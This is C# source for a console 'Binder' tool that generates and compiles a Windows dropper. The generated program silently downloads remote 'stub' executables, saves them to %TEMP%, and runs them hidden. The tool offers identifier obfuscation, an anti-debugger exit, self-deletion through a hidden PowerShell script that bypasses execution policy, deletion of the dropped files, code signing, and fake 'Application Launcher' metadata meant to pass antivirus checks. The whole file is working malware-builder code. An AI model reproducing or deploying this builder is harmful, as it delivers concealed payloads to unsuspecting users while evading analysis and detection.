using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Binder
{
    class Program
    {
        static async Task Main(string[] args)
        {
            Console.Title = "Binder - Executable Binder Tool";
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("╔══════════════════════════════════════════════════════════════╗");
            Console.WriteLine("║                        BINDER TOOL                           ║");
            Console.WriteLine("║                   By MidasRX On Github                       ║");
            Console.WriteLine("╚══════════════════════════════════════════════════════════════╝");
            Console.ResetColor();
            Console.WriteLine();

            try
            {
                // Get number of executables to bind
                Console.Write("Enter the number of executables to bind: ");
                if (!int.TryParse(Console.ReadLine(), out int exeCount) || exeCount <= 0)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Invalid number. Please enter a positive integer.");
                    Console.ResetColor();
                    return;
                }

                // Individual execution location will be chosen per executable

                // Get obfuscation preference
                Console.Write("\nDo you want to obfuscate the generated code? (y/n): ");
                string? obfuscateChoice = Console.ReadLine();
                bool useObfuscation = obfuscateChoice?.ToLower() == "y" || obfuscateChoice?.ToLower() == "yes";

                // Get timeout preference
                Console.Write("\nDo you want to set a custom timeout? (y/n): ");
                string? timeoutChoice = Console.ReadLine();
                int customTimeout = 0; // No timeout by default
                if (timeoutChoice?.ToLower() == "y" || timeoutChoice?.ToLower() == "yes")
                {
                    Console.Write("Enter timeout in seconds: ");
                    if (int.TryParse(Console.ReadLine(), out int timeout) && timeout > 0)
                    {
                        customTimeout = timeout;
                    }
                    else
                    {
                        customTimeout = 300; // Fallback to 5 minutes if invalid input
                    }
                }

                // Get anti-debugger preference
                Console.Write("\nDo you want to add anti-debugger protection? (y/n): ");
                string? antiDebugChoice = Console.ReadLine();
                bool useAntiDebug = antiDebugChoice?.ToLower() == "y" || antiDebugChoice?.ToLower() == "yes";

                // Get self-deletion preference
                Console.Write("\nDo you want the binder to delete itself after completing all tasks? (y/n): ");
                string? selfDeleteChoice = Console.ReadLine();
                bool deleteSelf = selfDeleteChoice?.ToLower() == "y" || selfDeleteChoice?.ToLower() == "yes";

                // Get code signing preference
                Console.Write("\nDo you want to sign the generated executable? (y/n): ");
                string? signChoice = Console.ReadLine();
                bool useCodeSigning = signChoice?.ToLower() == "y" || signChoice?.ToLower() == "yes";
                
                string? certificatePath = null;
                string? certificatePassword = null;
                string? timestampUrl = null;
                
                if (useCodeSigning)
                {
                    Console.Write("Enter path to certificate file (.pfx/.p12): ");
                    certificatePath = Console.ReadLine();
                    
                    Console.Write("Enter certificate password (leave empty if none): ");
                    certificatePassword = ReadPassword();
                    
                    Console.Write("Enter timestamp server URL (leave empty for default): ");
                    timestampUrl = Console.ReadLine();
                    if (string.IsNullOrWhiteSpace(timestampUrl))
                    {
                        timestampUrl = "http://timestamp.digicert.com";
                    }
                }

                // Get custom icon preference
                Console.Write("\nDo you want to use a custom icon for the output? (y/n): ");
                string? iconChoice = Console.ReadLine();
                bool useCustomIcon = iconChoice?.ToLower() == "y" || iconChoice?.ToLower() == "yes";
                string? iconUrl = null;
                string? iconFileName = null;
                
                if (useCustomIcon)
                {
                    Console.Write("Enter the URL to your .ico file (e.g., https://example.com/icon.ico): ");
                    iconUrl = Console.ReadLine();
                    Console.Write("Enter the icon filename to save as (e.g., app.ico): ");
                    iconFileName = Console.ReadLine();
                    
                    if (string.IsNullOrWhiteSpace(iconUrl) || string.IsNullOrWhiteSpace(iconFileName))
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("Warning: Icon URL and filename cannot be empty. Will use default icon.");
                        Console.ResetColor();
                        useCustomIcon = false;
                        iconUrl = null;
                        iconFileName = null;
                    }
                }

                // Get executable details with individual stub links and execution locations
                var executables = new List<ExecutableInfo>();
                for (int i = 0; i < exeCount; i++)
                {
                    Console.WriteLine($"\n--- Executable {i + 1} ---");
                    
                    Console.Write("Enter filename (e.g., program.exe): ");
                    string? filename = Console.ReadLine();
                    
                    if (string.IsNullOrWhiteSpace(filename))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Filename cannot be empty.");
                        Console.ResetColor();
                        return;
                    }

                    Console.Write("Enter stub link (URL to download): ");
                    string? stubLink = Console.ReadLine();
                    
                    if (string.IsNullOrWhiteSpace(stubLink))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Stub link cannot be empty.");
                        Console.ResetColor();
                        return;
                    }

                    Console.WriteLine("Choose execution location for this executable:");
                    Console.WriteLine("1. %TEMP% folder (recommended)");
                    Console.WriteLine("2. Same folder as the binder");
                    Console.Write("Enter your choice (1 or 2): ");
                    
                    string? locationChoice = Console.ReadLine();
                    bool useTempFolder = locationChoice != "2";

                    Console.Write("Delete this executable after execution? (y/n): ");
                    string? deleteChoice = Console.ReadLine();
                    bool deleteAfterExecution = deleteChoice?.ToLower() == "y" || deleteChoice?.ToLower() == "yes";

                    executables.Add(new ExecutableInfo { Filename = filename, StubLink = stubLink, UseTempFolder = useTempFolder, DeleteAfterExecution = deleteAfterExecution });
                }

                // Generate the binder code
                string binderCode = GenerateBinderCode(executables, useObfuscation, customTimeout, useAntiDebug, useCustomIcon, iconUrl, deleteSelf);
                
                // Create temporary project directory
                string tempProjectDir = "GeneratedBinder";
                if (Directory.Exists(tempProjectDir))
                {
                    Directory.Delete(tempProjectDir, true);
                }
                Directory.CreateDirectory(tempProjectDir);

                // If a custom icon was requested, download it to the temp project directory
                string? iconFileToUse = null;
                if (useCustomIcon && !string.IsNullOrWhiteSpace(iconUrl) && !string.IsNullOrWhiteSpace(iconFileName))
                {
                    try
                    {
                        using var httpClient = new HttpClient();
                        byte[] iconBytes = await httpClient.GetByteArrayAsync(iconUrl);
                        string localIconPath = Path.Combine(tempProjectDir, iconFileName);
                        File.WriteAllBytes(localIconPath, iconBytes);
                        iconFileToUse = iconFileName;
                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("Warning: Failed to download icon. Proceeding with default icon.");
                        Console.ResetColor();
                        useCustomIcon = false;
                        iconFileToUse = null;
                    }
                }

                // Save the binder code
                string binderCodePath = Path.Combine(tempProjectDir, "Program.cs");
                File.WriteAllText(binderCodePath, binderCode, Encoding.UTF8);
                
                                                                 // Create project file with AV-friendly settings
                string projectContent = @"<Project Sdk=""Microsoft.NET.Sdk"">
    <PropertyGroup>
      <OutputType>WinExe</OutputType>
      <TargetFramework>net6.0</TargetFramework>
      <ImplicitUsings>enable</ImplicitUsings>
      <Nullable>enable</Nullable>
      <SelfContained>true</SelfContained>
      <RuntimeIdentifier>win-x64</RuntimeIdentifier>
      <PublishSingleFile>true</PublishSingleFile>
      <PublishTrimmed>false</PublishTrimmed>
      <AssemblyTitle>Application Launcher</AssemblyTitle>
      <AssemblyDescription>Software Deployment Utility</AssemblyDescription>
      <AssemblyCompany>Software Solutions Inc</AssemblyCompany>
      <AssemblyProduct>Application Launcher</AssemblyProduct>
      <AssemblyVersion>2.1.0.0</AssemblyVersion>
      <FileVersion>2.1.0.0</FileVersion>" + 
      (useCustomIcon && !string.IsNullOrEmpty(iconFileToUse) ? $"\n     <ApplicationIcon>{iconFileToUse}</ApplicationIcon>" : "") + @"
    </PropertyGroup>
  </Project>";
                
                string projectPath = Path.Combine(tempProjectDir, "GeneratedBinder.csproj");
                File.WriteAllText(projectPath, projectContent, Encoding.UTF8);
                
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("\n🔄 Compiling generated binder...");
                Console.ResetColor();
                
                // Compile the project
                var startInfo = new ProcessStartInfo
                {
                    FileName = "dotnet",
                    Arguments = $"publish --configuration Release --output ./publish --self-contained true --runtime win-x64 --verbosity quiet",
                    WorkingDirectory = tempProjectDir,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };
                
                using var process = Process.Start(startInfo);
                string output = await process.StandardOutput.ReadToEndAsync();
                string error = await process.StandardError.ReadToEndAsync();
                await process.WaitForExitAsync();
                
                if (process.ExitCode == 0)
                {
                    // Copy the executable to current directory
                    string exeName = "GeneratedBinder.exe";
                    string sourceExe = Path.Combine(tempProjectDir, "publish", exeName);
                    string finalExe = exeName;
                    
                    if (!File.Exists(sourceExe))
                    {
                        // Fallback: search under the temp project directory for the exe
                        var found = Directory.GetFiles(tempProjectDir, exeName, SearchOption.AllDirectories);
                        if (found.Length > 0)
                        {
                            sourceExe = found[0];
                        }
                    }

                    if (File.Exists(sourceExe))
                    {
                        File.Copy(sourceExe, finalExe, true);

                        // Sign the executable if requested
                        if (useCodeSigning && !string.IsNullOrEmpty(certificatePath))
                        {
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine("🔐 Signing executable...");
                            Console.ResetColor();
                            
                            bool signSuccess = SignExecutable(finalExe, certificatePath, certificatePassword, timestampUrl);
                            
                            if (signSuccess)
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine("✓ Executable signed successfully");
                                Console.ResetColor();
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.Yellow;
                                Console.WriteLine("⚠ Warning: Code signing failed, but executable was created");
                                Console.ResetColor();
                            }
                        }
                        
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"\n✓ Binder executable created successfully!");
                        Console.WriteLine($"✓ Executable: {finalExe}");
                        Console.WriteLine($"✓ {exeCount} executables configured");
                        Console.WriteLine($"✓ Execution locations: Individual per executable");
                        Console.WriteLine($"✓ {exeCount} stub links configured");
                        Console.WriteLine($"✓ Obfuscation: {(useObfuscation ? "Enabled" : "Disabled")}");
                        Console.WriteLine($"✓ Timeout: {(customTimeout > 0 ? $"{customTimeout} seconds" : "No timeout")}");
                        Console.WriteLine($"✓ Anti-debugger: {(useAntiDebug ? "Enabled" : "Disabled")}");
                        Console.WriteLine($"✓ Self-deletion: {(deleteSelf ? "Enabled" : "Disabled")}");
                        Console.WriteLine($"✓ Custom Icon: {(useCustomIcon ? $"{(iconFileToUse ?? "Enabled")}" : "Default")}");
                        Console.WriteLine($"✓ Code signing: {(useCodeSigning ? "Enabled" : "Disabled")}");
                        Console.ResetColor();
                        
                        // Clean up temporary files
                        try
                        {
                            // Force delete all temporary files and folders
                            if (Directory.Exists(tempProjectDir))
                            {
                                // Remove read-only attributes first
                                RemoveReadOnlyAttributes(tempProjectDir);
                                Directory.Delete(tempProjectDir, true);
                            }
                        }
                        catch (Exception)
                        {
                            // Try alternative cleanup method
                            try
                            {
                                if (Directory.Exists(tempProjectDir))
                                {
                                    // Force delete using cmd
                                    var cleanupInfo = new ProcessStartInfo
                                    {
                                        FileName = "cmd",
                                        Arguments = $"/c rmdir /s /q \"{tempProjectDir}\"",
                                        UseShellExecute = false,
                                        CreateNoWindow = true
                                    };
                                    using var cleanupProcess = Process.Start(cleanupInfo);
                                    cleanupProcess?.WaitForExit();
                                }
                            }
                            catch
                            {
                                // If all cleanup fails, just log it
                                Console.ForegroundColor = ConsoleColor.Yellow;
                                Console.WriteLine($"Note: Could not clean up temporary files completely. You may need to manually delete the '{tempProjectDir}' folder.");
                                Console.ResetColor();
                            }
                        }
                    }
                    else
                    {
                        throw new Exception("Executable was not found after compilation");
                    }
                }
                else
                {
                    throw new Exception($"Compilation failed:\n{error}");
                }
                
                Console.WriteLine("\nPress any key to exit...");
                Console.ReadKey();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"\nError: {ex.Message}");
                Console.ResetColor();
                Console.WriteLine("\nPress any key to exit...");
                Console.ReadKey();
            }
        }

        static void RemoveReadOnlyAttributes(string path)
        {
            try
            {
                if (File.Exists(path))
                {
                    var attributes = File.GetAttributes(path);
                    if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                    {
                        File.SetAttributes(path, attributes & ~FileAttributes.ReadOnly);
                    }
                }
                else if (Directory.Exists(path))
                {
                    var attributes = File.GetAttributes(path);
                    if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                    {
                        File.SetAttributes(path, attributes & ~FileAttributes.ReadOnly);
                    }
                    
                    // Recursively remove read-only attributes from subdirectories and files
                    foreach (var file in Directory.GetFiles(path, "*", SearchOption.AllDirectories))
                    {
                        try
                        {
                            var fileAttributes = File.GetAttributes(file);
                            if ((fileAttributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                            {
                                File.SetAttributes(file, fileAttributes & ~FileAttributes.ReadOnly);
                            }
                        }
                        catch
                        {
                            // Ignore individual file errors
                        }
                    }
                    
                    foreach (var dir in Directory.GetDirectories(path, "*", SearchOption.AllDirectories))
                    {
                        try
                        {
                            var dirAttributes = File.GetAttributes(dir);
                            if ((dirAttributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                            {
                                File.SetAttributes(dir, dirAttributes & ~FileAttributes.ReadOnly);
                            }
                        }
                        catch
                        {
                            // Ignore individual directory errors
                        }
                    }
                }
            }
            catch
            {
                // Ignore cleanup errors
            }
        }

        static string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            var random = new Random();
            return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }

        static string ReadPassword()
        {
            string password = "";
            ConsoleKeyInfo key;
            do
            {
                key = Console.ReadKey(true);
                if (key.Key != ConsoleKey.Backspace && key.Key != ConsoleKey.Enter)
                {
                    password += key.KeyChar;
                    Console.Write("*");
                }
                else if (key.Key == ConsoleKey.Backspace && password.Length > 0)
                {
                    password = password.Substring(0, (password.Length - 1));
                    Console.Write("\b \b");
                }
            } while (key.Key != ConsoleKey.Enter);
            Console.WriteLine();
            return password;
        }

        static bool SignExecutable(string exePath, string certificatePath, string? password, string? timestampUrl)
        {
            try
            {
                // Check if signtool is available
                string signToolPath = FindSignTool();
                if (string.IsNullOrEmpty(signToolPath))
                {
                    Console.WriteLine("⚠ Warning: signtool.exe not found. Please install Windows SDK.");
                    return false;
                }

                // Check if certificate file exists
                if (!File.Exists(certificatePath))
                {
                    Console.WriteLine($"⚠ Warning: Certificate file not found: {certificatePath}");
                    return false;
                }

                // Build signtool arguments
                var args = new StringBuilder();
                args.Append("sign ");
                args.Append($"/f \"{certificatePath}\" ");
                
                if (!string.IsNullOrEmpty(password))
                {
                    args.Append($"/p \"{password}\" ");
                }
                
                if (!string.IsNullOrEmpty(timestampUrl))
                {
                    args.Append($"/t \"{timestampUrl}\" ");
                }
                
                args.Append($"\"{exePath}\"");

                // Execute signtool
                var startInfo = new ProcessStartInfo
                {
                    FileName = signToolPath,
                    Arguments = args.ToString(),
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                using var process = Process.Start(startInfo);
                if (process == null) return false;

                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (process.ExitCode == 0)
                {
                    return true;
                }
                else
                {
                    Console.WriteLine($"Signing error: {error}");
                    return false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Signing exception: {ex.Message}");
                return false;
            }
        }

        static string FindSignTool()
        {
            // Common paths for signtool.exe
            string[] possiblePaths = {
                @"C:\Program Files (x86)\Windows Kits\10\bin\10.0.22621.0\x64\signtool.exe",
                @"C:\Program Files (x86)\Windows Kits\10\bin\10.0.20348.0\x64\signtool.exe",
                @"C:\Program Files (x86)\Windows Kits\10\bin\10.0.19041.0\x64\signtool.exe",
                @"C:\Program Files (x86)\Windows Kits\10\bin\10.0.18362.0\x64\signtool.exe",
                @"C:\Program Files (x86)\Windows Kits\10\bin\x64\signtool.exe",
                @"C:\Program Files\Microsoft SDKs\Windows\v7.1A\Bin\signtool.exe",
                @"C:\Program Files (x86)\Microsoft SDKs\Windows\v7.1A\Bin\signtool.exe"
            };

            foreach (string path in possiblePaths)
            {
                if (File.Exists(path))
                {
                    return path;
                }
            }

            // Try to find in Windows Kits directory
            string windowsKitsPath = @"C:\Program Files (x86)\Windows Kits\10\bin";
            if (Directory.Exists(windowsKitsPath))
            {
                var signtools = Directory.GetFiles(windowsKitsPath, "signtool.exe", SearchOption.AllDirectories);
                if (signtools.Length > 0)
                {
                    // Prefer x64 version
                    var x64Version = signtools.FirstOrDefault(s => s.Contains("x64"));
                    return x64Version ?? signtools[0];
                }
            }

            // Try PATH environment variable
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "where",
                    Arguments = "signtool",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                };

                using var process = Process.Start(startInfo);
                if (process != null)
                {
                    string output = process.StandardOutput.ReadToEnd().Trim();
                    process.WaitForExit();
                    
                    if (process.ExitCode == 0 && !string.IsNullOrEmpty(output))
                    {
                        return output.Split('\n')[0].Trim();
                    }
                }
            }
            catch { }

            return string.Empty;
        }

        static string GenerateBinderCode(List<ExecutableInfo> executables, bool useObfuscation, int timeout, bool useAntiDebug, bool useCustomIcon, string? iconUrl, bool deleteSelf)
        {
            var sb = new StringBuilder();
            
            // Generate consistent random names for obfuscation
            string namespaceName = useObfuscation ? GenerateRandomString(8) : "Binder";
            string className = useObfuscation ? GenerateRandomString(10) : "Program";
            string methodName = useObfuscation ? GenerateRandomString(12) : "DownloadAndExecuteAll";
            
            // Add anti-debugger protection if enabled
            if (useAntiDebug)
            {
                sb.AppendLine("using System.Runtime.InteropServices;");
            }
            
            sb.AppendLine("using System;");
            sb.AppendLine("using System.Collections.Generic;");
            sb.AppendLine("using System.IO;");
            sb.AppendLine("using System.Net.Http;");
            sb.AppendLine("using System.Threading.Tasks;");
            sb.AppendLine("using System.Diagnostics;");
            sb.AppendLine("using System.Text;");
            sb.AppendLine("");
            
            sb.AppendLine($"namespace {namespaceName} {{");
            sb.AppendLine($"    class {className} {{");
            
            if (useAntiDebug)
            {
                sb.AppendLine("        [DllImport(\"kernel32.dll\")]");
                sb.AppendLine("        static extern bool IsDebuggerPresent();");
                sb.AppendLine("        ");
                sb.AppendLine("        [DllImport(\"kernel32.dll\")]");
                sb.AppendLine("        static extern void OutputDebugString(string lpOutputString);");
                sb.AppendLine("        ");
            }
            
            sb.AppendLine("        static async Task Main(string[] args) {");
            
            if (useAntiDebug)
            {
                sb.AppendLine("            // Anti-debugger protection");
                sb.AppendLine("            if (IsDebuggerPresent()) {");
                sb.AppendLine("                OutputDebugString(\"Debugger detected!\");");
                sb.AppendLine("                Environment.Exit(0);");
                sb.AppendLine("            }");
                sb.AppendLine("            ");
            }
            
            sb.AppendLine("            try {");
            sb.AppendLine($"                await {methodName}();");
            sb.AppendLine("            } catch (Exception ex) {");
            sb.AppendLine("                // Silent error handling");
            sb.AppendLine("            }");
            sb.AppendLine("        }");
            sb.AppendLine("        ");
            sb.AppendLine($"        static async Task {methodName}() {{");
            sb.AppendLine("            using var httpClient = new HttpClient();");
            if (timeout > 0)
            {
                sb.AppendLine($"            httpClient.Timeout = TimeSpan.FromSeconds({timeout});");
            }
            else
            {
                sb.AppendLine("            // No timeout set - will wait indefinitely");
            }
            sb.AppendLine("            ");
            
            // Generate variable names for each executable
            var variableNames = new List<string>();
            for (int i = 0; i < executables.Count; i++)
            {
                string varName = useObfuscation ? GenerateRandomString(8) : $"stubLink{i + 1}";
                variableNames.Add(varName);
                sb.AppendLine($"            const string {varName} = \"{executables[i].StubLink}\";");
            }
            sb.AppendLine("");
            
            // Set up both path variables for individual use
            sb.AppendLine("            string tempPath = Path.GetTempPath();");
            sb.AppendLine("            string currentDir = AppDomain.CurrentDomain.BaseDirectory;");
            sb.AppendLine("");
            
            // Download and execute each stub
            for (int i = 0; i < executables.Count; i++)
            {
                var exe = executables[i];
                string varName = variableNames[i];
                string dataVar = useObfuscation ? GenerateRandomString(8) : $"stubData{i + 1}";
                string pathVar = useObfuscation ? GenerateRandomString(8) : $"stubPath{i + 1}";
                string processVar = useObfuscation ? GenerateRandomString(8) : $"processInfo{i + 1}";
                
                sb.AppendLine($"            // Download and execute {exe.Filename}");
                sb.AppendLine($"            try {{");
                sb.AppendLine($"                byte[] {dataVar} = await httpClient.GetByteArrayAsync({varName});");
                sb.AppendLine($"                ");
                
                if (exe.UseTempFolder)
                {
                    sb.AppendLine($"                string {pathVar} = Path.Combine(tempPath, \"{exe.Filename}\");");
                }
                else
                {
                    sb.AppendLine($"                string {pathVar} = Path.Combine(currentDir, \"{exe.Filename}\");");
                }
                sb.AppendLine($"                ");
                sb.AppendLine($"                File.WriteAllBytes({pathVar}, {dataVar});");
                sb.AppendLine($"                ");
                sb.AppendLine($"                var {processVar} = new ProcessStartInfo {{");
                sb.AppendLine($"                    FileName = {pathVar},");
                sb.AppendLine($"                    UseShellExecute = false,");
                sb.AppendLine($"                    CreateNoWindow = true,");
                sb.AppendLine($"                    WindowStyle = ProcessWindowStyle.Hidden");
                sb.AppendLine($"                }};");
                sb.AppendLine($"                ");
                sb.AppendLine($"                Process.Start({processVar});");
                
                // Add deletion logic if requested
                if (exe.DeleteAfterExecution)
                {
                    sb.AppendLine($"                ");
                    sb.AppendLine($"                // Delete the executable after execution");
                    sb.AppendLine($"                try {{");
                    sb.AppendLine($"                    await Task.Delay(2000); // Wait 2 seconds for process to start");
                    sb.AppendLine($"                    File.Delete({pathVar});");
                    sb.AppendLine($"                }} catch {{");
                    sb.AppendLine($"                    // Silent error handling for deletion");
                    sb.AppendLine($"                }}");
                }
                
                sb.AppendLine($"            }} catch (Exception ex{i + 1}) {{");
                sb.AppendLine($"                // Silent error handling for {exe.Filename}");
                sb.AppendLine($"            }}");
                if (i < executables.Count - 1)
                {
                    sb.AppendLine($"            ");
                }
            }
            
            // Add self-deletion logic if requested
            if (deleteSelf)
            {
                sb.AppendLine("");
                sb.AppendLine("            // Self-deletion after all tasks completed");
                sb.AppendLine("            try {");
                sb.AppendLine("                // Get current executable path - try multiple methods");
                sb.AppendLine("                string currentExe = Environment.ProcessPath ?? ");
                sb.AppendLine("                                   System.Reflection.Assembly.GetExecutingAssembly().Location ??");
                sb.AppendLine("                                   Environment.GetCommandLineArgs()[0];");
                sb.AppendLine("                ");
                sb.AppendLine("                if (!string.IsNullOrEmpty(currentExe) && File.Exists(currentExe)) {");
                sb.AppendLine("                    // Create PowerShell script for more reliable deletion");
                sb.AppendLine("                    string psPath = Path.Combine(Path.GetTempPath(), $\"cleanup_{Guid.NewGuid():N}.ps1\");");
                sb.AppendLine("                    string psContent = $\"Start-Sleep -Seconds 1; Remove-Item -Path '{currentExe}' -Force -ErrorAction SilentlyContinue; Remove-Item -Path '{psPath}' -Force -ErrorAction SilentlyContinue\";");
                sb.AppendLine("                    File.WriteAllText(psPath, psContent);");
                sb.AppendLine("                    ");
                sb.AppendLine("                    // Try PowerShell first");
                sb.AppendLine("                    try {");
                sb.AppendLine("                        Process.Start(new ProcessStartInfo {");
                sb.AppendLine("                            FileName = \"powershell.exe\",");
                sb.AppendLine("                            Arguments = $\"-WindowStyle Hidden -ExecutionPolicy Bypass -File \\\"{psPath}\\\"\",");
                sb.AppendLine("                            UseShellExecute = false,");
                sb.AppendLine("                            CreateNoWindow = true,");
                sb.AppendLine("                            WindowStyle = ProcessWindowStyle.Hidden");
                sb.AppendLine("                        });");
                sb.AppendLine("                    } catch {");
                sb.AppendLine("                        // Fallback to batch file method");
                sb.AppendLine("                        string batchPath = Path.Combine(Path.GetTempPath(), $\"cleanup_{Guid.NewGuid():N}.bat\");");
                sb.AppendLine("                        string batchContent = $\"@echo off\\ntimeout /t 1 /nobreak > nul\\nattrib -r -s -h \\\"{currentExe}\\\" 2>nul\\ndel /f /q \\\"{currentExe}\\\" 2>nul\\ndel /f /q \\\"{batchPath}\\\" 2>nul\";");
                sb.AppendLine("                        File.WriteAllText(batchPath, batchContent);");
                sb.AppendLine("                        Process.Start(new ProcessStartInfo {");
                sb.AppendLine("                            FileName = batchPath,");
                sb.AppendLine("                            UseShellExecute = false,");
                sb.AppendLine("                            CreateNoWindow = true,");
                sb.AppendLine("                            WindowStyle = ProcessWindowStyle.Hidden");
                sb.AppendLine("                        });");
                sb.AppendLine("                    }");
                sb.AppendLine("                    ");
                sb.AppendLine("                    // Exit immediately after starting deletion");
                sb.AppendLine("                    Environment.Exit(0);");
                sb.AppendLine("                }");
                sb.AppendLine("            } catch {");
                sb.AppendLine("                // Silent error handling for self-deletion");
                sb.AppendLine("            }");
            }
            
            sb.AppendLine("        }");
            sb.AppendLine("    }");
            sb.AppendLine("}");

            return sb.ToString();
        }
    }

    class ExecutableInfo
    {
        public string Filename { get; set; } = string.Empty;
        public string StubLink { get; set; } = string.Empty;
        public bool UseTempFolder { get; set; } = true;
        public bool DeleteAfterExecution { get; set; } = false;
    }
} 
